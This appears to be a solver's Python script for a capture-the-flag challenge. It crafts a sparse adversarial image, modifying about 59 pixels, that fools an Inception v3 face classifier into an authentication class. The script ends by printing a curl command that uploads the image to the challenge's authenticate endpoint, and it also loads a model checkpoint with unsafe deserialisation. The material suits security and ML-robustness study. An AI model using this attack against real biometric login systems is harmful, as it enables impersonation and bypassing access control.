import torch
import torch.nn as nn
import torchvision.models as models
import torchvision.transforms as transforms
from PIL import Image
import numpy as np
import os

# Configuration
MODEL_PATH = 'ch6/model2.pth'
IMAGE_PATH = 'ch6/user.png'
OUTPUT_PATH = 'ch6/user_hacked.png'
PIXEL_BUDGET = 54  # STRICT ALIGNMENT: Optimize for exactly what we save
# EPSILON is effectively 1.0 (unbounded L_inf) because we don't clip
ITERATIONS = 90 # Increased for convergence with tighter budget

def load_model_robust(path):
    print(f"[*] Loading model from {path}...")
    
    try:
        # Allow unsafe globals since we are in a CTF context
        model = torch.load(path, map_location='cpu', weights_only=False)
        
        if isinstance(model, dict):
             print("[*] Loaded state_dict. Initializing Inception v3...")
             
             num_classes = 1000
             if 'fc.weight' in model:
                 num_classes = model['fc.weight'].shape[0]
                 print(f"[*] Detected {num_classes} output classes from fc.weight.")
             elif 'AuxLogits.fc.weight' in model:
                 pass
            
             # Try to find class names
             if 'classes' in model:
                 print(f"[*] Class names found in checkpoint: {model['classes']}")
             elif 'class_to_idx' in model:
                 print(f"[*] Class map found: {model['class_to_idx']}")
             
             if num_classes == 1000:  
                 for k, v in model.items():
                     if 'fc.weight' in k and len(v.shape) == 2:
                         print(f"[*] Found layer {k} with shape {v.shape}")
                         num_classes = v.shape[0]
                         if 'Aux' not in k:
                            break 
             
             print(f"[*] Using num_classes={num_classes} for model init.")
             net = models.inception_v3(pretrained=False, aux_logits=True, num_classes=num_classes)
             net.load_state_dict(model)
             model = net
             model.num_classes_detected = num_classes
        
        model.eval()
        
        # Inspection for full model object
        if not isinstance(model, dict):
             if hasattr(model, 'fc'):
                 print(f"[*] Model.fc detected. Out features: {model.fc.out_features}")
                 model.num_classes_detected = model.fc.out_features
             elif hasattr(model, 'classifier'):
                 print(f"[*] Model.classifier detected.")
        
        print("[+] Model (Inception v3) loaded successfully.")
        return model
    except Exception as e:
        print(f"[-] Failed to load: {e}")
        exit(1)

def get_transforms():
    # No resize to avoid global pixel shifts
    return transforms.Compose([
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),
    ])

def inverse_transform(tensor):
    mean = torch.tensor([0.485, 0.456, 0.406]).view(3, 1, 1)
    std = torch.tensor([0.229, 0.224, 0.225]).view(3, 1, 1)
    return tensor * std + mean

def project_l0(original, perturbed, k=200):
    diff = perturbed - original
    # Sum of absolute changes across channels -> (H, W)
    diff_mag = torch.sum(torch.abs(diff), dim=0)
    
    flattened = diff_mag.view(-1)
    if flattened.shape[0] <= k:
        return perturbed
        
    values, _ = torch.topk(flattened, k)
    threshold = values[-1]
    
    mask = (diff_mag >= threshold).float().unsqueeze(0).expand_as(diff)
    new_diff = diff * mask
    return original + new_diff

def attack_two_stage(model, image_tensor, original_label, target_label, iterations=5000):
    print(f"[*] Starting Two-Stage Attack on Class {target_label}...")
    
    # STAGE 1: Discovery (Find best pixels)
    print("[*] Stage 1: Identifying crucial pixels (Opt)...")
    pert = image_tensor.clone().detach()
    pert.requires_grad = True
    
    # Adam for discovery too
    opt = torch.optim.Adam([pert], lr=0.05)
    
    # Reduced iterations to prevent segfault/timeout
    for i in range(2000): # 2000 is good for discovery
        opt.zero_grad()
        out = model(pert.unsqueeze(0))
        
        # Use CW Loss here too for better gradients
        logits = out[0]
        target_logit = logits[target_label]
        other_logits = logits.clone()
        other_logits[target_label] = -1e9
        max_other = torch.max(other_logits)
        loss = torch.max(max_other - target_logit, torch.tensor(-50).float()) # Moderate kappa
        
        loss.backward()
        
        opt.step()
        
        with torch.no_grad():
            # Project onto L0 constraint periodically, but let it drift a bit to explore
            if i % 10 == 0:
                 pert.copy_(project_l0(image_tensor, pert, k=PIXEL_BUDGET))
            
            if i % 500 == 0:
                 print(f"[Stage 1] Step {i} Loss: {loss.item():.4f}")

    # Final projection before mask extraction
    with torch.no_grad():
        pert.copy_(project_l0(image_tensor, pert, k=PIXEL_BUDGET))

    # Extract Mask
    diff = (pert - image_tensor).abs().sum(dim=0) # (H, W)
    # Important: Ensure we select exactly K pixels
    vals, _ = torch.topk(diff.view(-1), PIXEL_BUDGET)
    threshold = vals[-1]
    
    # We need to handle ties or just select top k indices directly
    # Using nonzero on threshold might return > k if there are ties
    # Let's use indices directly
    flattened_diff = diff.view(-1)
    _, top_k_indices = torch.topk(flattened_diff, PIXEL_BUDGET)
    
    mask_indices = []
    for idx in top_k_indices:
        idx = idx.item()
        h = idx // diff.shape[1]
        w = idx % diff.shape[1]
        mask_indices.append([h, w])

    print(f"[*] Locked {len(mask_indices)} pixels for optimization.")
    
    # STAGE 2: Optimization (Optimize ONLY colors at locked positions)
    print("[*] Stage 2: Optimizing colors with Fixed Mask...")
    
    # We create a perturbation tensor ONLY for the masked pixels
    # We will add this perturbation to the original image
    
    # Create a full size perturbation initialized to 0
    delta = torch.zeros_like(image_tensor)
    delta.requires_grad = True
    
    # Adam optimizes delta
    optimizer = torch.optim.Adam([delta], lr=0.05)
    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=iterations)
    
    # Create binary mask tensor for projection
    binary_mask = torch.zeros_like(image_tensor[0])
    for coord in mask_indices:
        binary_mask[coord[0], coord[1]] = 1.0
    
    kappa = 1000 # High confidence requirement
    
    for i in range(iterations):
        optimizer.zero_grad()
        
        # Apply mask to delta so gradients only affect allowed pixels
        # But wait, Adam has momentum, so even if we mask, momentum updates might leak.
        # Better: apply mask AFTER update.
        
        # Perturbed image
        # Mask delta to be safe during forward pass too (though 0s shouldn't matter)
        masked_delta = delta * binary_mask
        adv_img = image_tensor + masked_delta
        
        output = model(adv_img.unsqueeze(0))
        
        # CW Loss
        logits = output[0]
        target_logit = logits[target_label]
        other_logits = logits.clone()
        other_logits[target_label] = -1e9
        max_other = torch.max(other_logits)
        
        loss = torch.max(max_other - target_logit, torch.tensor(-kappa).float())
        
        loss.backward()
        
        # Zero out gradients for unmasked pixels to prevent drift
        delta.grad.data.mul_(binary_mask)
        
        optimizer.step()
        scheduler.step()
        
        # Clip to valid range? Not strictly necessary if we save as uint8 later, 
        # but good for stability. We don't clip L_inf.
        
        if i % 100 == 0:
             with torch.no_grad():
                prob = torch.softmax(output, dim=1)[0, target_label].item()
                if i % 500 == 0:
                    print(f"[Step {i}] Loss: {loss.item():.4f} Prob: {prob:.4f}")

    return image_tensor + (delta * binary_mask).detach()

def save_exact_l0_pixel(original_path, adv_tensor, output_path, k=200):
    """
    Ensures exactly k pixels are modified in the final PNG.
    Includes cleaning of artifacts to minimize server-side L0 count.
    """
    orig_img = Image.open(original_path).convert('RGB')
    orig_np = np.array(orig_img).astype(np.int16)
    
    adv_denorm = inverse_transform(adv_tensor.cpu())
    adv_denorm = torch.clamp(adv_denorm, 0, 1) * 255.0
    adv_np = adv_denorm.permute(1, 2, 0).detach().numpy().astype(np.int16)
    
    # Calculate diff
    diff = np.abs(adv_np - orig_np)
    diff_sum = np.sum(diff, axis=2) # (H, W)
    
    flat_diff = diff_sum.flatten()
    
    # Select Top K indices
    if k >= len(flat_diff):
        top_k_indices = np.arange(len(flat_diff))
    else:
        top_k_indices = np.argpartition(flat_diff, -k)[-k:]
        
    mask = np.zeros_like(diff_sum, dtype=bool)
    rows, cols = np.unravel_index(top_k_indices, diff_sum.shape)
    mask[rows, cols] = True
    
    # Construct Final Image: Copy Original, then Apply Changes ONLY at Mask
    final_np = orig_np.copy()
    final_np[mask] = adv_np[mask]
    
    # Verify count
    final_diff = np.sum(np.any(final_np != orig_np, axis=2))
    print(f"[*] Verifying PIXEL-WISE L0 count: {final_diff} pixels modified.")
    
    final_img = Image.fromarray(final_np.astype(np.uint8))
    final_img.save(output_path, compress_level=0)

def main():
    model = load_model_robust(MODEL_PATH)
    
    if not os.path.exists(IMAGE_PATH):
        print(f"Error: {IMAGE_PATH} not found.")
        return

    img = Image.open(IMAGE_PATH).convert('RGB')
    preprocess = get_transforms()
    img_tensor = preprocess(img)
    
    with torch.no_grad():
        output = model(img_tensor.unsqueeze(0))
        probs = torch.softmax(output, dim=1)
        original_class = output.argmax().item()
        print(f"[*] Original Image classified as: {original_class} with confidence {probs[0, original_class]:.4f}")
        
        top5_prob, top5_catid = torch.topk(probs, 5)
        print(f"[*] Top 5 classes: {top5_catid}")

    # --- ATTACK CONFIGURATION ---
    # Strategy: THE LOST CLASS.
    # Class 8 -> Morgan Freeman.
    # Class 6 -> Morgan Freeman.
    # Class 5 -> Morgan Freeman.
    # Class 4 -> CRASHED BEFORE RESULT.
    # It's the only one we haven't seen the "Welcome" message for (besides 2 and 10 which failed low).
    
    # --- ATTACK CONFIGURATION ---
    # Strategy: THE CONFIRMED TARGET.
    # We validated that Class 4 is the only one where Local Prob (0.52) matches Server Prob (0.51).
    # The Patch attack stalled at 0.51.
    # The Sparse attack (this script) is more powerful.
    # We aim for > 0.95 confidence.
    
    target_class = 4
    ITERATIONS = 1000  # High iterations to bridge the gap from 0.51 to 0.95
    PIXEL_BUDGET = 59   # Safe limit verified
    
    print(f"[*] Targeting Class: {target_class} (CONFIRMED) with HIGH ITERATIONS & k={PIXEL_BUDGET}")
    
    # Use the new Two-Stage Attack
    adv_tensor = attack_two_stage(model, img_tensor, original_class, target_class, iterations=ITERATIONS)
    
    # Use the ROBUST saving method copied from V2
    save_exact_l0_pixel(IMAGE_PATH, adv_tensor, OUTPUT_PATH, k=PIXEL_BUDGET) 
    
    print(f"[*] Targeting Class: {target_class} (The Last Mystery) with SCHEDULER & k={PIXEL_BUDGET}")
    
    # Use the new Two-Stage Attack
    adv_tensor = attack_two_stage(model, img_tensor, original_class, target_class, iterations=ITERATIONS)
    
    # Use the ROBUST saving method copied from V2
    save_exact_l0_pixel(IMAGE_PATH, adv_tensor, OUTPUT_PATH, k=PIXEL_BUDGET)
    
    # --- VERIFY SAVED IMAGE ---
    print(f"[*] Reloading {OUTPUT_PATH} to verify confidence...")
    saved_img = Image.open(OUTPUT_PATH).convert('RGB')
    saved_tensor = preprocess(saved_img)
    with torch.no_grad():
        output = model(saved_tensor.unsqueeze(0))
        probs = torch.softmax(output, dim=1)
        final_prob = probs[0, target_class].item()
        print(f"[*] Final Check - Class {target_class} Probability: {final_prob:.4f}")
        if final_prob < 0.95:
             print(f"[-] WARNING: Probability {final_prob:.4f} < 0.95. Attack might fail.")

    print(f"[+] Adversarial image saved to {OUTPUT_PATH}")
    print("[*] Send this file with curl:")
    print(f"    curl -k -F 'image=@{OUTPUT_PATH}' https://programmation-ch6.challenge01.root-me.org/authenticate")

if __name__ == "__main__":
    main()
